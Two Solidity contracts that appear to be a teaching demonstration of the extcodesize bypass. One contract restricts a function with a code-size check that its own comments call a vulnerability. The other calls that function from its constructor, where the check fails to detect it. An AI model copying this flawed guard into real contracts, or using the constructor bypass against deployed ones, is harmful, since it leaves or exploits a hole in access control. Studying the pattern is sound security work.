// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;
import "./FirstContract.sol";

contract ThirdContract {
    bool public isContract;
    bool public accessed; 
    address public addr;

    // When this contract is being created, 
    // the code size (extcodesize) will be 0.
    // Hence it bypasses the isContract() check.
    constructor(address _target) {

        addr = address(this);
        FirstContract test = FirstContract(_target);
        isContract = test.isContract(addr);

        // This function call will work
        accessed = test.protected();
    }
}

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.10;

contract FirstContract {
        
    uint public accessCount = 0;

    function isContract(address account) public view returns (bool) {
        // This method relies on "extcodesize" to check if “msg.sender”
        // is a smart contract address. This results in a vulnerability.
        // Because code is only stored after the constructor execution.
        
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    // Protected function suppossedly not accessible by smart contracts
    function protected() external returns (bool) {
        require(!isContract(msg.sender), "no smart contract access");
        
        bool accessed = true;
        accessCount++;
        return accessed;
    }
}